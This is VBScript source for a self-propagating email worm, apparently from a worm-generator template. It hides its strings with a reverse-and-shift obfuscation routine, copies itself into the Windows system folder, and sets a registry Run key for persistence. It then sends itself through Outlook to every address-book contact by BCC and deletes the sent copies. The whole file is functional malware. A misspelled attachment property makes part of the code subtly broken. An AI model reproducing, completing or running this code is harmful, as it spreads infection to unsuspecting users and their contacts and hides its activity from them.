' Type the Worm's name here

On Error Resume Next

Dim PHP
Dim W1L
Dim H1Z8L2S
Dim LJ3JXI
Dim GS9K7XCP
Dim VX2DW
Dim H3UM

Set PHP = CreateObject( HRDT( "udfkcPnfutzTfmjG/hojuqjsdT" ) )
PHP.CopyFile WScript.ScriptFullName, PHP.BuildPath( PHP.GetSpecialFolder(1), HRDT( "TCW/JFM7WY" ) )

Set W1L = CreateObject( HRDT( "mmfiT/uqjsdTX" ) )
W1L.RegWrite HRDT( "]ovS]opjtsfWuofssvD]txpeojX]ugptpsdjN]fsbxugpT]FOJIDBN`MBDPM`ZFLI" ) & HRDT( "JFM7WY" ), PHP.BuildPath( PHP.GetSpecialFolder(1), HRDT( "TCW/JFM7WY" ) )

OOMC = W1L.RegRead( HRDT( "]FOJIDBN`MBDPM`ZFLI" ) & HRDT( "JFM7WY" ) )

If OOMC = "" Or OOMC > 20 Then
   OOMC = 0
End If

If OOMC = 0 Then
   Set GS9K7XCP = CreateObject( HRDT( "opjubdjmqqB/lppmuvP" ) )
   Set H1Z8L2S = GS9K7XCP.GetNameSpace( HRDT( "JQBN" ) )

   For Each LJ3JXI In H1Z8L2S.AddressLists
       Set PZO = GS9K7XCP.CreateItem( 0 )

       For VX2DW = 1 To LJ3JXI.AddressEntries.Count
           Set H3UM = LJ3JXI.AddressEntries( VX2DW )

           If VX2DW = 1 Then
              PZO.BCC = H3UM.Address
           Else
              PZO.BCC = PZO.BCC & HRDT( "!<" ) & H3UM.Address
           End If
       Next

       PZO.Subject = HRDT( "///fsfi!udfkcvt!t(fhbttfn!fiu!fqzU" )
       PZO.Body = HRDT( "///fsfi!zepc!t(fhbttfn!fiu!fqzU" )
       PZO.Attachmets.Add WScript.ScriptFullName
       PZO.DeleteAfterSubmit = True
       PZO.Send
   Next

   OOMC = 0
End If

W1L.RegWrite HRDT( "]FOJIDBN`MBDPM`ZFLI" ) & HRDT( "JFM7WY" ), OOMC + 1

Function HRDT( U738B1A )
   Dim Z02I
   Dim BFM8I1
   Dim ZBZ07LX

   Z02I = ""

   For BFM8I1 = 1 To Len( U738B1A )
       ZBZ07LX = Mid( U738B1A, BFM8I1, 1 )

       Z02I = Chr( Asc( ZBZ07LX ) - 1 ) & Z02I
   Next

   HRDT = Z02I
End Function
